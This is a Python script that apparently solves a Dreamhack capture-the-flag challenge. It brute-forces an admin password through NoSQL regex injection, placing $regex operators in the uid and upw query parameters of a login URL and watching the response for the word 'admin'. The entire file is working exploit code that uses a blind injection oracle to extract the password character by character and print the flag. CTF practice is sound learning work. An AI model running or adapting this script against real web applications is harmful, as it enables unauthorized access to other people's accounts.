import requests
import sys

URL = "http://host3.dreamhack.games:22626/login"
ConfirmKey = "admin"
FilterKey = "undefined"
Dict = "0123456789qwertyuiopasdfghjklzxcvbnm{}"
length = 32
password = ""
Colors = ["\033[37m", "\033[32m", "\033[31m"]


def sendReq(payload):
    return requests.get(
        URL + "/?uid[$regex]=adm.*&upw[$regex]={" + str(password) + str(payload) + ".*"
    )


print("[*] Started")
print("[*] Using fixed password length : " + str(length))
print("[*] Looking for password")
while True:
    for Current in Dict:
        ReqResult = sendReq(Current).text
        if ConfirmKey in ReqResult:
            password += Current
            print(
                Colors[1]
                + "[+] Found password of state "
                + str(len(password))
                + " : "
                + str(Current)
            )
            print(
                "["
                + str(len(password))
                + "/"
                + str(length)
                + "] Current State : {"
                + password
                + Colors[0]
            )
            if len(password) == length:
                break
        else:
            print(Colors[2] + "[-] Tried : " + str(Current) + Colors[0])
    if len(password) == length:
        break
    else:
        print(
            Colors[1]
            + "[*] One loop done ["
            + str(len(password))
            + " , "
            + password
            + "]"
            + Colors[0]
        )
print(
    Colors[1]
    + "\n[*] Job Done!\n[LENGTH] "
    + str(length + 4)
    + "\n[PASSWORD] "
    + str("DH{" + password + "}")
    + Colors[0]
)
